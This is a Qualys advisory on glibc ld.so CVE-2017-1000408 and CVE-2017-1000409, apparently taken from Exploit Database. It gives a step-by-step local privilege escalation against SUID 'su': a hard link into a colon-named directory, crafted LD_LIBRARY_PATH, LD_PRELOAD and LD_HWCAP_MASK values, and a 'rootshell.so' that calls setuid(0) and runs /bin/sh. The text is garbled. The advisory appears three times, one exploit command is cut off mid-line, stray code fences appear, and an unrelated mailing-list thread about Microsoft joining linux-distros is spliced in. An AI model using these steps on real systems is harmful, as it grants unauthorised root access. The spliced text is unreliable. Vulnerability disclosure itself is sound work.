Summary
========================================================================

We have discovered a memory leak and a buffer overflow in the dynamic
loader (ld.so) of the GNU C Library (glibc):

- the memory leak (CVE-2017-1000408) first appeared in glibc 2.1.1
  (released on May 24, 1999) and can be reached and amplified through
  the LD_HWCAP_MASK environment variable;

- the buffer overflow (CVE-2017-1000409) first appeared in glibc 2.5
  (released on September 29, 2006) and can be triggered through the
  LD_LIBRARY_PATH environment variable.

Further investigation showed that:

- the buffer overflow is not exploitable if
  /proc/sys/fs/protected_hardlinks is enabled (it is not enabled by
  default on vanilla Linux kernels, but most Linux distributions turn it
  on by default);

- the memory leak and the buffer overflow are not exploitable if the
  glibc is patched against CVE-2017-1000366, because this patch ignores
  the LD_HWCAP_MASK and LD_LIBRARY_PATH environment variables when SUID
  binaries are executed (CVE-2017-1000366 was first patched in glibc
  2.26, released on August 2, 2017, but most Linux distributions had
  already backported this patch on June 19, 2017).

We have therefore rated the impact of these vulnerabilities as Low.
Nevertheless, we give a brief analysis of the vulnerable function, and
present a simple method for exploiting a SUID binary on the command line
and obtaining full root privileges (if /proc/sys/fs/protected_hardlinks
is not enabled, and CVE-2017-1000366 is not patched).

========================================================================
Memory Leak (CVE-2017-1000408)
========================================================================

------------------------------------------------------------------------
Analysis
------------------------------------------------------------------------

In _dl_init_paths(), ld.so malloc()ates "rtld_search_dirs.dirs[0]", a
cache of information about the system's trusted directories (typically
"/lib" and "/usr/lib" on 32-bit or "/lib64" and "/usr/lib64" on 64-bit).
To compute the number of system directories, ld.so uses the classic C
idiom "sizeof (system_dirs) / sizeof (system_dirs[0])":

 691   rtld_search_dirs.dirs[0] = (struct r_search_path_elem *)
 692     malloc ((sizeof (system_dirs) / sizeof (system_dirs[0]))
 693             * round_size * sizeof (struct r_search_path_elem));

Unfortunately, "system_dirs" is not a classic array: it is not an array
of strings (pointers to characters), but rather an array of characters,
the concatenation of all system directories, separated by null bytes:

 109 static const char system_dirs[] = SYSTEM_DIRS;

where "SYSTEM_DIRS" is generated by "gen-trusted-dirs.awk" (typically
"/lib/\0/usr/lib/" on 32-bit or "/lib64/\0/usr/lib64/" on 64-bit). As a
result, the number of system directories is overestimated, and too much
memory is allocated for "rtld_search_dirs.dirs[0]": if "system_dirs" is
"/lib/\0/usr/lib/" for example, the number of system directories is 2,
but 16 is used instead (the number of characters in "system_dirs") to
compute the size of "rtld_search_dirs.dirs[0]".

This extra memory is never accessed, never freed, and mostly filled with
null bytes, because only the information about "nsystem_dirs_len" system
directories (the correct number of system directories) is written to
"rtld_search_dirs.dirs[0]", and because the minimal malloc()
implementation in ld.so calls mmap(), but never munmap().

Moreover, this memory leak can be amplified through the LD_HWCAP_MASK
environment variable, because ld.so uses "ncapstr" (the total number of
hardware-capability combinations) to compute the size of
"rtld_search_dirs.dirs[0]":

 687   round_size = ((2 * sizeof (struct r_search_path_elem) - 1
 688                  + ncapstr * sizeof (enum r_dir_status))
 689                 / sizeof (struct r_search_path_elem));

We tracked down this vulnerability to:

commit ab7eb292307152e706948a7b19164ff5e6d593d4
Date:   Mon May 3 21:59:35 1999 +0000

    Update.

        * elf/Makefile (trusted-dirs.st): Use gen-trusted-dirs.awk.
        * elf/gen-trusted-dirs.awk: New file.
        * elf/dl-load.c (systems_dirs): Moved into file scope.  Initialize
        from SYSTEM_DIRS macro.
        (system_dirs_len): New variable.  Contains lengths of system_dirs
        strings.
        (fillin_rpath): Rewrite for systems_dirs being a simple string.
        Improve string comparisons.  Change parameter trusted to be a flag.
        Change all callers.
        (_dt_init_paths): Improve using new format for system_dirs.

which transformed "system_dirs" from an array of strings (pointers to
characters) into an array of characters:

-  static const char *system_dirs[] =
-  {
-#include "trusted-dirs.h"
-    NULL
-  };
...
+static const char system_dirs[] = SYSTEM_DIRS;

========================================================================
Buffer Overflow (CVE-2017-1000409)
========================================================================

------------------------------------------------------------------------
Analysis
------------------------------------------------------------------------

In _dl_init_paths(), ld.so computes "nllp", the number of
colon-separated directories in "llp" (the LD_LIBRARY_PATH environment
variable), malloc()ates "env_path_list.dirs", an array of "nllp + 1"
pointers to "r_search_path_elem" structures (one for each directory in
"llp", plus a terminating NULL pointer), and calls fillin_rpath() to
fill in "env_path_list.dirs":

 777   if (llp != NULL && *llp != '\0')
 778     {
 779       size_t nllp;
 780       const char *cp = llp;
 781       char *llp_tmp;
 ...
 803       nllp = 1;
 804       while (*cp)
 805         {
 806           if (*cp == ':' || *cp == ';')
 807             ++nllp;
 808           ++cp;
 809         }
 810
 811       env_path_list.dirs = (struct r_search_path_elem **)
 812         malloc ((nllp + 1) * sizeof (struct r_search_path_elem *));
 ...
 819       (void) fillin_rpath (llp_tmp, env_path_list.dirs, ":;",
 820                            __libc_enable_secure, "LD_LIBRARY_PATH",
 821                            NULL, l);

Unfortunately, ld.so parses the "llp" string to compute "nllp" but
parses the "llp_tmp" string (an expanded copy of "llp") to fill in
"env_path_list.dirs". As a result, the number of pointers written to
"env_path_list.dirs" can be greater than "nllp + 1" (an mmap()-based
buffer overflow) if the contents of "llp_tmp" differ from the contents
of "llp" (if "llp_tmp" contains more colons than "llp"):

 784       /* Expand DSTs.  */
 785       size_t cnt = DL_DST_COUNT (llp, 1);
 786       if (__glibc_likely (cnt == 0))
 787         llp_tmp = strdupa (llp);
 788       else
 789         {
 790           /* Determine the length of the substituted string.  */
 791           size_t total = DL_DST_REQUIRED (l, llp, strlen (llp), cnt);
 792
 793           /* Allocate the necessary memory.  */
 794           llp_tmp = (char *) alloca (total + 1);
 795           llp_tmp = _dl_dst_substitute (l, llp, llp_tmp, 1);
 796         }

The Dynamic String Tokens (DSTs) $LIB and $PLATFORM are expanded to
fixed strings that do not contain colons (typically "lib" and "i686" on
32-bit or "lib64" and "x86_64" on 64-bit), but the expansion of $ORIGIN
(the directory of the binary being executed) can inject extra colons
into "llp_tmp" and hence extra pointers into "env_path_list.dirs".

To exploit this buffer overflow, a local attacker must therefore be able
to:

- hard-link a SUID binary into a directory whose pathname contains
  colons (i.e., /proc/sys/fs/protected_hardlinks must not be enabled);

- pass the LD_LIBRARY_PATH environment variable to _dl_init_paths()
  (i.e., CVE-2017-1000366 must not be patched).

We tracked down this vulnerability to:

commit 950398e1320255572f4228db94344dcd5f613455
Date:   Tue Aug 29 01:44:27 2006 +0000

    * elf/dl-load.c (_dl_init_paths): Expand DSTs.

which added the expansion of llp's Dynamic String Tokens (DSTs) to
_dl_init_paths():

-      char *llp_tmp = strdupa (llp);
+      char *llp_tmp;
...
+      /* Expand DSTs.  */
+      size_t cnt = DL_DST_COUNT (llp, 1);
+      if (__builtin_expect (cnt == 0, 1))
+       llp_tmp = strdupa (llp);
+      else
+       {
+         /* Determine the length of the substituted string.  */
+         size_t total = DL_DST_REQUIRED (l, llp, strlen (llp), cnt);
+
+         /* Allocate the necessary memory.  */
+         llp_tmp = (char *) alloca (total + 1);
+         llp_tmp = _dl_dst_substitute (l, llp, llp_tmp, 1);
+       }

========================================================================
Exploitation
========================================================================

------------------------------------------------------------------------
Debian 9 (i386)
------------------------------------------------------------------------

In this example, we exploit the SUID-root binary "su" on a 32-bit Debian
9.0: we installed "debian-9.0.0-i386-xfce-CD-1.iso" (the last release
before glibc's CVE-2017-1000366 was patched), and manually disabled
protected_hardlinks ("echo 0 > /proc/sys/fs/protected_hardlinks").

1/ First, we identify the system's trusted directories (the only
directories accepted by fillin_rpath() when executing a SUID binary):

$ env -i LD_PRELOAD=nonexistent LD_HWCAP_MASK=0 LD_DEBUG=libs env 2>&1 | head
      1607:     find library=nonexistent [0]; searching
      1607:      search cache=/etc/ld.so.cache
      1607:      search
path=/lib/i386-linux-gnu/tls/i686:/lib/i386-linux-gnu/tls:/lib/i386-linux-gnu/i686:/lib/i386-linux-gnu:/usr/lib/i386-linux-gnu/tls/i686:/usr/lib/i386-linux-gnu/tls:/usr/lib/i386-linux-gnu/i686:/usr/lib/i386-linux-gnu:/lib/tls/i686:/lib/tls:/lib/i686:/lib:/usr/lib/tls/i686:/usr/lib/tls:/usr/lib/i686:/usr/lib
            (system search path)
      1607:       trying file=/lib/i386-linux-gnu/tls/i686/nonexistent
      1607:       trying file=/lib/i386-linux-gnu/tls/nonexistent
      1607:       trying file=/lib/i386-linux-gnu/i686/nonexistent
      1607:       trying file=/lib/i386-linux-gnu/nonexistent
      1607:       trying file=/usr/lib/i386-linux-gnu/tls/i686/nonexistent
      1607:       trying file=/usr/lib/i386-linux-gnu/tls/nonexistent
      1607:       trying file=/usr/lib/i386-linux-gnu/i686/nonexistent

The "system search path" line shows four system directories:
"/lib/i386-linux-gnu", "/usr/lib/i386-linux-gnu", "/lib", and "/usr/lib"
("tls" and "i686" are default hardware capabilities that are enabled
even if LD_HWCAP_MASK is 0).

2/ Second, we create our $ORIGIN directory and hard-link the SUID-root
binary "su" into it:

$ mkdir -p '/var/tmp/:/lib:/usr/lib:'

$ cd '/var/tmp/:/lib:/usr/lib:'

$ ln `which su` .

The pathname of our $ORIGIN directory contains two system directories:
we will write 12 bytes (3 pointers: one for each system directory, plus
a terminating NULL pointer) to an 8-byte "env_path_list.dirs" ("nllp" is
only 1, because our unexpanded LD_LIBRARY_PATH does not contain colons).
In other words, we will overflow "env_path_list.dirs" and write 4 bytes
(the terminating NULL pointer) out of bounds.

3/ Third, we overwrite this out-of-bounds NULL pointer with the first
bytes of an error message ("cannot open shared object file") that is
malloc()ated after "env_path_list.dirs" because of our "nonexistent"
preload library. Consequently, ld.so crashes when open_path() tries to
open our second preload library "rootshell.so" in a directory described
by an "r_search_path_elem" structure located at the unmapped address
0x6e6e6163 (the overwritten NULL pointer):

$ env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
Segmentation fault

$ dmesg | tail -n 1
[70632.888695] su[2293]: segfault at 6e6e6173 ip b77e1c43 sp bfc946dc error 4 in ld-2.24.so[b77db000+22000]

The "/../../../../../../../../$LIB" suffix is required, to pass the
"check_for_trusted" test in _dl_dst_substitute() (our expanded
LD_LIBRARY_PATH must be rooted in one of the system's trusted
directories).

4/ Next, we copy the library dependencies of "su" to our current working
directory, and compile our preload library "rootshell.so" ("la.c" can be
found at the beginning of our stack-clash exploit "Linux_ldso_hwcap.c"):

$ cp -- `ldd ./su | grep ' => /' | awk '{print $3}'` .

$ cat > la.c << "EOF"

```
> ```
> static void __attribute__ ((constructor)) _init (void) {
>     ...
>     // setuid(0);
>     ...
>     // execve("/bin/sh");
>     ...
> }
> EOF
>
> ```

```

$ gcc -fpic -shared -nostdlib -Os -s -o rootshell.so la.c

$ chmod u+s rootshell.so

This "chmod" is required, to pass the SUID-bit test in open_path().

5/ Last, we run "su" with an increasing number of hardware capabilities
(i.e., with an increasingly large "rtld_search_dirs.dirs[0]"), until the
"rtld_search_dirs.dirs[0]" occupies the address 0x6e6e6163. Because this
"rtld_search_dirs.dirs[0]" is mostly filled with null bytes, and because
an "r_search_path_elem" structure filled with null bytes is equivalent
to the current working directory in open_path(), ld.so will eventually
load and execute our "rootshell.so" from the current working directory:

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so'

Buffer overflow in glibc's ld.so

========================================================================
Summary
========================================================================

We have discovered a memory leak and a buffer overflow in the dynamic
loader (ld.so) of the GNU C Library (glibc):

- the memory leak (CVE-2017-1000408) first appeared in glibc 2.1.1
  (released on May 24, 1999) and can be reached and amplified through
  the LD_HWCAP_MASK environment variable;

- the buffer overflow (CVE-2017-1000409) first appeared in glibc 2.5
  (released on September 29, 2006) and can be triggered through the
  LD_LIBRARY_PATH environment variable.

Further investigation showed that:

- the buffer overflow is not exploitable if
  /proc/sys/fs/protected_hardlinks is enabled (it is not enabled by
  default on vanilla Linux kernels, but most Linux distributions turn it
  on by default);

- the memory leak and the buffer overflow are not exploitable if the
  glibc is patched against CVE-2017-1000366, because this patch ignores
  the LD_HWCAP_MASK and LD_LIBRARY_PATH environment variables when SUID
  binaries are executed (CVE-2017-1000366 was first patched in glibc
  2.26, released on August 2, 2017, but most Linux distributions had
  already backported this patch on June 19, 2017).

We have therefore rated the impact of these vulnerabilities as Low.
Nevertheless, we give a brief analysis of the vulnerable function, and
present a simple method for exploiting a SUID binary on the command line
and obtaining full root privileges (if /proc/sys/fs/protected_hardlinks
is not enabled, and CVE-2017-1000366 is not patched).

========================================================================
Memory Leak (CVE-2017-1000408)
========================================================================

------------------------------------------------------------------------
Analysis
------------------------------------------------------------------------

In _dl_init_paths(), ld.so malloc()ates "rtld_search_dirs.dirs[0]", a
cache of information about the system's trusted directories (typically
"/lib" and "/usr/lib" on 32-bit or "/lib64" and "/usr/lib64" on 64-bit).
To compute the number of system directories, ld.so uses the classic C
idiom "sizeof (system_dirs) / sizeof (system_dirs[0])":

 691   rtld_search_dirs.dirs[0] = (struct r_search_path_elem *)
 692     malloc ((sizeof (system_dirs) / sizeof (system_dirs[0]))
 693             * round_size * sizeof (struct r_search_path_elem));

Unfortunately, "system_dirs" is not a classic array: it is not an array
of strings (pointers to characters), but rather an array of characters,
the concatenation of all system directories, separated by null bytes:

 109 static const char system_dirs[] = SYSTEM_DIRS;

where "SYSTEM_DIRS" is generated by "gen-trusted-dirs.awk" (typically
"/lib/\0/usr/lib/" on 32-bit or "/lib64/\0/usr/lib64/" on 64-bit). As a
result, the number of system directories is overestimated, and too much
memory is allocated for "rtld_search_dirs.dirs[0]": if "system_dirs" is
"/lib/\0/usr/lib/" for example, the number of system directories is 2,
but 16 is used instead (the number of characters in "system_dirs") to
compute the size of "rtld_search_dirs.dirs[0]".

This extra memory is never accessed, never freed, and mostly filled with
null bytes, because only the information about "nsystem_dirs_len" system
directories (the correct number of system directories) is written to
"rtld_search_dirs.dirs[0]", and because the minimal malloc()
implementation in ld.so calls mmap(), but never munmap().

Moreover, this memory leak can be amplified through the LD_HWCAP_MASK
environment variable, because ld.so uses "ncapstr" (the total number of
hardware-capability combinations) to compute the size of
"rtld_search_dirs.dirs[0]":

 687   round_size = ((2 * sizeof (struct r_search_path_elem) - 1
 688                  + ncapstr * sizeof (enum r_dir_status))
 689                 / sizeof (struct r_search_path_elem));

History
------------------------------------------------------------------------

We tracked down this vulnerability to:

commit ab7eb292307152e706948a7b19164ff5e6d593d4
Date:   Mon May 3 21:59:35 1999 +0000

    Update.

        * elf/Makefile (trusted-dirs.st): Use gen-trusted-dirs.awk.
        * elf/gen-trusted-dirs.awk: New file.
        * elf/dl-load.c (systems_dirs): Moved into file scope.  Initialize
        from SYSTEM_DIRS macro.
        (system_dirs_len): New variable.  Contains lengths of system_dirs
        strings.
        (fillin_rpath): Rewrite for systems_dirs being a simple string.
        Improve string comparisons.  Change parameter trusted to be a flag.
        Change all callers.
        (_dt_init_paths): Improve using new format for system_dirs.

which transformed "system_dirs" from an array of strings (pointers to
characters) into an array of characters:

-  static const char *system_dirs[] =
-  {
-#include "trusted-dirs.h"
-    NULL
-  };
...
+static const char system_dirs[] = SYSTEM_DIRS;

========================================================================
Buffer Overflow (CVE-2017-1000409)
========================================================================

------------------------------------------------------------------------
Analysis
------------------------------------------------------------------------

In _dl_init_paths(), ld.so computes "nllp", the number of
colon-separated directories in "llp" (the LD_LIBRARY_PATH environment
variable), malloc()ates "env_path_list.dirs", an array of "nllp + 1"
pointers to "r_search_path_elem" structures (one for each directory in
"llp", plus a terminating NULL pointer), and calls fillin_rpath() to
fill in "env_path_list.dirs":

 777   if (llp != NULL && *llp != '\0')
 778     {
 779       size_t nllp;
 780       const char *cp = llp;
 781       char *llp_tmp;
 ...
 803       nllp = 1;
 804       while (*cp)
 805         {
 806           if (*cp == ':' || *cp == ';')
 807             ++nllp;
 808           ++cp;
 809         }
 810
 811       env_path_list.dirs = (struct r_search_path_elem **)
 812         malloc ((nllp + 1) * sizeof (struct r_search_path_elem *));
 ...
 819       (void) fillin_rpath (llp_tmp, env_path_list.dirs, ":;",
 820                            __libc_enable_secure, "LD_LIBRARY_PATH",
 821                            NULL, l);

Unfortunately, ld.so parses the "llp" string to compute "nllp" but
parses the "llp_tmp" string (an expanded copy of "llp") to fill in
"env_path_list.dirs". As a result, the number of pointers written to
"env_path_list.dirs" can be greater than "nllp + 1" (an mmap()-based
buffer overflow) if the contents of "llp_tmp" differ from the contents
of "llp" (if "llp_tmp" contains more colons than "llp"):

 784       /* Expand DSTs.  */
 785       size_t cnt = DL_DST_COUNT (llp, 1);
 786       if (__glibc_likely (cnt == 0))
 787         llp_tmp = strdupa (llp);
 788       else
 789         {
 790           /* Determine the length of the substituted string.  */
 791           size_t total = DL_DST_REQUIRED (l, llp, strlen (llp), cnt);
 792
 793           /* Allocate the necessary memory.  */
 794           llp_tmp = (char *) alloca (total + 1);
 795           llp_tmp = _dl_dst_substitute (l, llp, llp_tmp, 1);
 796         }

The Dynamic String Tokens (DSTs) $LIB and $PLATFORM are expanded to
fixed strings that do not contain colons (typically "lib" and "i686" on
32-bit or "lib64" and "x86_64" on 64-bit), but the expansion of $ORIGIN
(the directory of the binary being executed) can inject extra colons
into "llp_tmp" and hence extra pointers into "env_path_list.dirs".

To exploit this buffer overflow, a local attacker must therefore be able
to:

- hard-link a SUID binary into a directory whose pathname contains
  colons (i.e., /proc/sys/fs/protected_hardlinks must not be enabled);

- pass the LD_LIBRARY_PATH environment variable to _dl_init_paths()
  (i.e., CVE-2017-1000366 must not be patched).

------------------------------------------------------------------------

We tracked down this vulnerability to:

commit 950398e1320255572f4228db94344dcd5f613455
Date:   Tue Aug 29 01:44:27 2006 +0000

    * elf/dl-load.c (_dl_init_paths): Expand DSTs.

which added the expansion of llp's Dynamic String Tokens (DSTs) to
_dl_init_paths():

-      char *llp_tmp = strdupa (llp);
+      char *llp_tmp;
...
+      /* Expand DSTs.  */
+      size_t cnt = DL_DST_COUNT (llp, 1);
+      if (__builtin_expect (cnt == 0, 1))
+       llp_tmp = strdupa (llp);
+      else
+       {
+         /* Determine the length of the substituted string.  */
+         size_t total = DL_DST_REQUIRED (l, llp, strlen (llp), cnt);
+
+         /* Allocate the necessary memory.  */
+         llp_tmp = (char *) alloca (total + 1);
+         llp_tmp = _dl_dst_substitute (l, llp, llp_tmp, 1);
+       }

========================================================================
Exploitation
========================================================================

------------------------------------------------------------------------
Debian 9 (i386)
------------------------------------------------------------------------

In this example, we exploit the SUID-root binary "su" on a 32-bit Debian
9.0: we installed "debian-9.0.0-i386-xfce-CD-1.iso" (the last release
before glibc's CVE-2017-1000366 was patched), and manually disabled
protected_hardlinks ("echo 0 > /proc/sys/fs/protected_hardlinks").

1/ First, we identify the system's trusted directories (the only
directories accepted by fillin_rpath() when executing a SUID binary):

$ env -i LD_PRELOAD=nonexistent LD_HWCAP_MASK=0 LD_DEBUG=libs env 2>&1 | head
      1607:     find library=nonexistent [0]; searching
      1607:      search cache=/etc/ld.so.cache
      1607:      search path=/lib/i386-linux-gnu/tls/i686:/lib/i386-linux-gnu/tls:/lib/i386-linux-gnu/i686:/lib/i386-linux-gnu:/usr/lib/i386-linux-gnu/tls/i686:/usr/lib/i386-linux-gnu/tls:/usr/lib/i386-linux-gnu/i686:/usr/lib/i386-linux-gnu:/lib/tls/i686:/lib/tls:/lib/i686:/lib:/usr/lib/tls/i686:/usr/lib/tls:/usr/lib/i686:/usr/lib            (system search path)
      1607:       trying file=/lib/i386-linux-gnu/tls/i686/nonexistent
      1607:       trying file=/lib/i386-linux-gnu/tls/nonexistent
      1607:       trying file=/lib/i386-linux-gnu/i686/nonexistent
      1607:       trying file=/lib/i386-linux-gnu/nonexistent
      1607:       trying file=/usr/lib/i386-linux-gnu/tls/i686/nonexistent
      1607:       trying file=/usr/lib/i386-linux-gnu/tls/nonexistent
      1607:       trying file=/usr/lib/i386-linux-gnu/i686/nonexistent

The "system search path" line shows four system directories:
"/lib/i386-linux-gnu", "/usr/lib/i386-linux-gnu", "/lib", and "/usr/lib"
("tls" and "i686" are default hardware capabilities that are enabled
even if LD_HWCAP_MASK is 0).

2/ Second, we create our $ORIGIN directory and hard-link the SUID-root
binary "su" into it:

$ mkdir -p '/var/tmp/:/lib:/usr/lib:'

$ cd '/var/tmp/:/lib:/usr/lib:'

$ ln `which su` .

The pathname of our $ORIGIN directory contains two system directories:
we will write 12 bytes (3 pointers: one for each system directory, plus
a terminating NULL pointer) to an 8-byte "env_path_list.dirs" ("nllp" is
only 1, because our unexpanded LD_LIBRARY_PATH does not contain colons).
In other words, we will overflow "env_path_list.dirs" and write 4 bytes
(the terminating NULL pointer) out of bounds.

3/ Third, we overwrite this out-of-bounds NULL pointer with the first
bytes of an error message ("cannot open shared object file") that is
malloc()ated after "env_path_list.dirs" because of our "nonexistent"
preload library. Consequently, ld.so crashes when open_path() tries to
open our second preload library "rootshell.so" in a directory described
by an "r_search_path_elem" structure located at the unmapped address
0x6e6e6163 (the overwritten NULL pointer):

$ env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' ./su
ERROR: ld.so: object 'nonexistent' from LD_PRELOAD cannot be preloaded (cannot open shared object file): ignored.
Segmentation fault

$ dmesg | tail -n 1
[70632.888695] su[2293]: segfault at 6e6e6173 ip b77e1c43 sp bfc946dc error 4 in ld-2.24.so[b77db000+22000]

The "/../../../../../../../../$LIB" suffix is required, to pass the
"check_for_trusted" test in _dl_dst_substitute() (our expanded
LD_LIBRARY_PATH must be rooted in one of the system's trusted
directories).

4/ Next, we copy the library dependencies of "su" to our current working
directory, and compile our preload library "rootshell.so" ("la.c" can be
found at the beginning of our stack-clash exploit "Linux_ldso_hwcap.c"):

$ cp -- `ldd ./su | grep ' => /' | awk '{print $3}'` .

$ cat > la.c << "EOF"
> static void __attribute__ ((constructor)) _init (void) {
>     ...
>     // setuid(0);
>     ...
>     // execve("/bin/sh");
>     ...
> }
> EOF
$ gcc -fpic -shared -nostdlib -Os -s -o rootshell.so la.c

$ chmod u+s rootshell.so

This "chmod" is required, to pass the SUID-bit test in open_path().

5/ Last, we run "su" with an increasing number of hardware capabilities
(i.e., with an increasingly large "rtld_search_dirs.dirs[0]"), until the
"rtld_search_dirs.dirs[0]" occupies the address 0x6e6e6163. Because this
"rtld_search_dirs.dirs[0]" is mostly filled with null bytes, and because
an "r_search_path_elem" structure filled with null bytes is equivalent
to the current working directory in open_path(), ld.so will eventually
load and execute our "rootshell.so" from the current working directory:

$ time env -i LD_LIBRARY_PATH='$ORIGIN/../../../../../../../../$LIB' LD_PRELOAD='nonexistent:rootshell.so' LD_HWCAP_MASK="$(((1<<16)-1))" ./su

In this example, we exploit "su" on a 32-bit CentOS 7.3.1611: we
installed "CentOS-7-i386-Minimal-1611.iso" (the last release before
CVE-2017-1000366 was patched), and manually disabled protected_hardlinks
("echo 0 > /proc/sys/fs/protected_hardlinks").

##### About The Exploit Database

×

[![OffSec](/images/offsec-logo.png)](https://www.offsec.com/)
The Exploit Database is maintained by [OffSec](https://www.offsec.com/community-projects/), an information security training company
that provides various [Information Security Certifications](https://www.offsec.com/courses-and-certifications/) as well as high end [penetration testing](https://www.offsec.com/penetration-testing/) services. The Exploit Database is a
non-profit project that is provided as a public service by OffSec.

The Exploit Database is a [CVE
compliant](http://cve.mitre.org/data/refs/refmap/source-EXPLOIT-DB.html) archive of public exploits and corresponding vulnerable software,
developed for use by penetration testers and vulnerability researchers. Our aim is to serve
the most comprehensive collection of exploits gathered through direct submissions, mailing
lists, as well as other public sources, and present them in a freely-available and
easy-to-navigate database. The Exploit Database is a repository for exploits and
proof-of-concepts rather than advisories, making it a valuable resource for those who need
actionable data right away.

The [Google Hacking Database (GHDB)](/google-hacking-database)
is a categorized index of Internet search engine queries designed to uncover interesting,
and usually sensitive, information made publicly available on the Internet. In most cases,
this information was never meant to be made public but due to any number of factors this
information was linked in a web document that was crawled by a search engine that
subsequently followed that link and indexed the sensitive information.

The process known as “Google Hacking” was popularized in 2000 by Johnny
Long, a professional hacker, who began cataloging these queries in a database known as the
Google Hacking Database. His initial efforts were amplified by countless hours of community
member effort, documented in the book Google Hacking For Penetration Testers and popularised
by a barrage of media attention and Johnny’s talks on the subject such as this early talk
recorded at [DEFCON 13](https://www.defcon.org/html/links/dc-archives/dc-13-archive.html). Johnny coined the term “Googledork” to refer
to “a foolish or inept person as revealed by Google“. This was meant to draw attention to
the fact that this was not a “Google problem” but rather the result of an often
unintentional misconfiguration on the part of a user or a program installed by the user.
Over time, the term “dork” became shorthand for a search query that located sensitive
information and “dorks” were included with may web application vulnerability releases to
show examples of vulnerable web sites.

After nearly a decade of hard work by the community, Johnny turned the GHDB
over to [OffSec](https://www.offsec.com/community-projects/) in November 2010, and it is now maintained as
an extension of the [Exploit Database](/). Today, the GHDB includes searches for
other online search engines such as [Bing](https://www.bing.com/),
and other online repositories like [GitHub](https://github.com/),
producing different, yet equally valuable results.

I'm not a member of security@k.o, but that list isn't what we're looking
for. We've talked about this with Greg before sending this application,
and he has pointed out that security@k.o is not a disclosure list, but
rather just a way to pull in kernel folks to fix issues. Some (most?) of
the kernel bugs that get fixed don't go through that list to begin with.

The kernel's documentation with regards to security issues and
disclosure actually points to linux-distros:
<https://www.kernel.org/doc/Documentation/admin-guide/security-bugs.rst> .

To complicate your question further: the Linux usage on our cloud has
surpassed Windows, as a by-product of that MSRC has started receiving
security reports of issues with Linux code both from users and vendors.
It's also the case that issues that are common for Windows and Linux
(like those speculative hardware bugs) are shared with us via MSRC as
well.

If you think that there's value in connecting between these 3
entities, I'd be happy to do so (maybe as part of a new task).

Indeed. When we debated linux-distros application internally, I tried to
do this estimate based on issues previously handled by linux-distros,
and it seemed like it would be valuable here.

With Sphere it's also hard to guess how are customers will be using it,
it's a rather unique mix of HaaS (the chip contains cores that would
belong to the user) and SaaS (where we provide mechanism to manage the
IoT device that the user will build on). I can go over this in more
detail if you'd like.

With WSLv2, users can choose to bring in a third party distro userspace
to run on top our kernel+lightweight userspace. This means that users
can be running a Debian/Ubuntu/Fedora/etc userspace modified to run on
WSLv2, on top of a kernel we supply.

For us it means that we are now the proud owners of multiple
frankensteined distro userspaces as well as a custom kernel. You might
call it out as being derivative of those distros, but I believe that at
the very least this is similar to the OpenVZ/CloudLinux scenario.

Honestly, these ones are even harder to deal with than the regular IaaS
offerings we have: customers who use these offerings expect (and
rightfully so) to be able to boot/update into a secure environment
moments after a public disclosure of a security issue, which is not
something we are able to provide right now.

Sure! Issues on the stats page that would not have been reported to MSRC
but are relevant to us would include:

 - On the kernel side, issues such as CVE-2017-7533
  (<https://www.openwall.com/lists/oss-security/2017/08/03/2>) would be
  relevant for all our offerings.

 - Core libraries affect us as well, for example CVE-2017-1000408
   (<https://www.openwall.com/lists/oss-security/2017/12/11/4>). This
   would affect our Sphere and SaaS offerings, as well as probably make
   us run through them through test gauntlet for WSLv2.

 - Higher level Linux tools, such as the one in CVE-2018-14722
   (<https://www.openwall.com/lists/oss-security/2018/08/14/7>) affect
   mostly our IaaS offerings, but I expect that we'd again validate the
   rest of our offerings with the fix.

Sure, we'd love to help with the list's pain points.

This could be interesting for us. we already work closely with multiple
distros as part of our public IaaS offering, as well as my work
maintaining the stable tree means I interact often with many subsystem
maintainers. We could leverage that for this task.

I think that this task would also benefit from collaboration with MSRC,
where for example we could verify whether the Bluetooth issue you brought
up would affect Windows, and whether issues reported to MSRC also affect
Linux.

Great! Sounds like a plan.

True, but we care about more than just the kernel side of things.

Can I suggest that we fork the discussion around security-bugs.rst to
LKML? I can suggest an initial patch to address your comments here but I
think that this is better handled on LKML.

My concern with Monday is timezones: we should do the math here, but I'd
like to avoid spilling over to Sunday (or very early Monday for that
matter) for some timezones.

As far as I understand specific dates for the microarchitectural bugs
were set pretty late in the process.

It's not just the microarchitectural bugs I was referring to, we are
getting security reports from users about security bugs in various
distros and we end up circling back with relevant distros to patch them
up. A recent example would be:
[https://bugs.launchpad.net/ubuntu/+source/linux/+bug/1834499](https://bugs.launchpad.net/ubuntu/%2Bsource/linux/%2Bbug/1834499) where an
internal user has reported a kernel memory leak due to a missing patch
in Ubuntu.

Microsoft's history with Linux is a rather recent one. I can offer the
following examples if you're willing to give us a few months off of the
"1 year" requirement:

I'd love to develop a framework that would allow for sharing of reports
between linux-distros/security@.../MSRC given the explicit approval of
the reporter. I think that the current "silo" model is broken.

Microsoft in general, and MSRC in particular have proved during
Meltdown/Spectre that they are a trusted entity which can work well with
the open source community to advance our common goals.

Qualys Security Advisory

Buffer overflow in glibc's ld.so

========================================================================

========================================================================
Summary
========================================================================

We have discovered a memory leak and a buffer overflow in the dynamic
loader (ld.so) of the GNU C Library (glibc):

- the memory leak (CVE-2017-1000408) first appeared in glibc 2.1.1
  (released on May 24, 1999) and can be reached and amplified through
  the LD_HWCAP_MASK environment variable;

- the buffer overflow (CVE-2017-1000409) first appeared in glibc 2.5
  (released on September 29, 2006) and can be triggered through the
  LD_LIBRARY_PATH environment variable.

Further investigation showed that:

- the buffer overflow is not exploitable if
  /proc/sys/fs/protected_hardlinks is enabled (it is not enabled by
  default on vanilla Linux kernels, but most Linux distributions turn it
  on by default);

- the memory leak and the buffer overflow are not exploitable if the
  glibc is patched against CVE-2017-1000366, because this patch ignores
  the LD_HWCAP_MASK and LD_LIBRARY_PATH environment variables when SUID
  binaries are executed (CVE-2017-1000366 was first patched in glibc
  2.26, released on August 2, 2017, but most Linux distributions had
  already backported this patch on June 19, 2017).

We have therefore rated the impact of these vulnerabilities as Low.
Nevertheless, we give a brief analysis of the vulnerable function, and
present a simple method for exploiting a SUID binary on the command line
and obtaining full root privileges (if /proc/sys/fs/protected_hardlinks
is not enabled, and CVE-2017-1000366 is not patched).

========================================================================
